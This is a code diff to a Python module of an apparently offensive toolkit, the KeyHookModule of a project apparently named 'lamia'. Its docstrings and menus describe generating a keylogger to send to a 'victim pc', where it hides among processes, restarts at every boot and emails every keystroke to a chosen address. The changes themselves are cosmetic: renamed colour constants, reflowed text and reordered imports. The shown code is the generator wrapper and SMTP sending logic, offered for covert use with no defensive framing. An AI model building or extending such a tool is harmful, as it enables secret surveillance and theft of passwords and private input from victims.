@@ -1,8 +1,7 @@
 """
-Key-hook.
+Key-logger.
 """
 
-# PSL
 import platform
 import sys
 import smtplib
@@ -10,21 +9,21 @@ from inspect import cleandoc
 from os import name, remove
 from typing import NoReturn
 
-# Own
-from .untils import clear_terminal, decorate_text, pause_script, Text, _Path
-from .user_information import UserDeviceInformation
 from lamia.exceptions import (
     WrongUserChoiceError,
     NotCompatibleSystemYetError,
     WrongEmailCredentials,
 )
+from .untils import clear_terminal, decorate_text, pause_script, TextColor, _Path
+from .user_information import UserDeviceInformation
 
 
 class KeyHookModule(UserDeviceInformation):
     """
-    This is key-logger created by me from scratch. If this key-logger will be on victim pc it
-    will start automatically each time victim turn on computer. After collecting data from keyboard,
-    key-hook automatically will sent collected data to chosen email.
+    This is key-logger created by me from scratch. If this key-logger will be on
+    victim pc it will start automatically each time victim turn on computer. After
+    collecting data from keyboard, key-hook automatically will sent collected data to
+    chosen email.
     """
 
     def __repr__(self) -> str:
@@ -50,16 +49,17 @@ class KeyHookModule(UserDeviceInformation):
             print(NotCompatibleSystemYetError(platform.system()))
 
     def __show_menu(self) -> NoReturn:
+        clear_terminal()
         print(
             cleandoc(
                 f"""
             {100 * "-"}
-            Using this module you can generate{Text.warning} KEY-HOOK {Text.endc}.
-            After generating key-hook you can sent him to another computer. When you run key-hook
-            on other machine, key-hook will hide in process. When remote computer starts up again,
-            key-hook starts up too. Key-hook will sent all symbols input from victim keyboard
-            to given address email.
-            Do you want to continue? {Text.warning}Y/N{Text.endc}
+            Using this module you can generate{TextColor.WARNING} KEY-HOOK {TextColor.ENDC}.
+            After generating key-hook you can sent him to another computer. When you
+            run key-hook on other machine, key-hook will hide in process. When remote
+            computer starts up again, key-hook starts up too. Key-hook will sent all
+            symbols input from victim keyboard to given address email.
+            Do you want to continue? {TextColor.WARNING}Y/N{TextColor.ENDC}
             {100 * "-"}
             """
             )
@@ -75,8 +75,8 @@ class KeyHookModule(UserDeviceInformation):
         print(
             cleandoc(
                 f"""
-                {40 * "-"}{Text.blue} KEY-HOOK GENERATOR {Text.endc}{40 * "-"}
-                Two email addresses are {Text.warning}required!{Text.endc}
+                {40 * "-"}{TextColor.BLUE} KEY-HOOK GENERATOR {TextColor.ENDC}{40 * "-"}
+                Two email addresses are {TextColor.WARNING}required!{TextColor.ENDC}
                 """
             )
         )
@@ -206,7 +206,7 @@ class KeyHookModule(UserDeviceInformation):
                     f"{self._sender_email_name}", f"{self._sender_email_password}"
                 )
             except smtplib.SMTPAuthenticationError:
-                print(f"{Text.error}ERROR!{Text.endc} Wrong Credentials!")
+                print(f"{TextColor.ERROR}ERROR!{TextColor.ENDC} Wrong Credentials!")
                 remove(self._key_hook.script_path)
                 print(WrongEmailCredentials())
                 sys.exit(1)
@@ -217,9 +217,9 @@ class KeyHookModule(UserDeviceInformation):
         print(
             cleandoc(
                 f"""
-            The script will send all symbols from the keyboard on the computer on which it will
-            will run to this email address: {Text.warning}{self._receiver_email_name}
-            {Text.endc}
+            The script will send all symbols from the keyboard on the computer on which
+            it will will run to this email address:
+            {TextColor.WARNING} {self._receiver_email_name}{TextColor.ENDC}
             """
             )
         )
@@ -247,7 +247,7 @@ class KeyHookModule(UserDeviceInformation):
         print(
             cleandoc(
                 f"""
-            Script saved here: {Text.warning}{self._key_hook.script_path}{Text.endc}
+            Script saved here: {TextColor.WARNING}{self._key_hook.script_path}{TextColor.ENDC}
             """
             )
         )
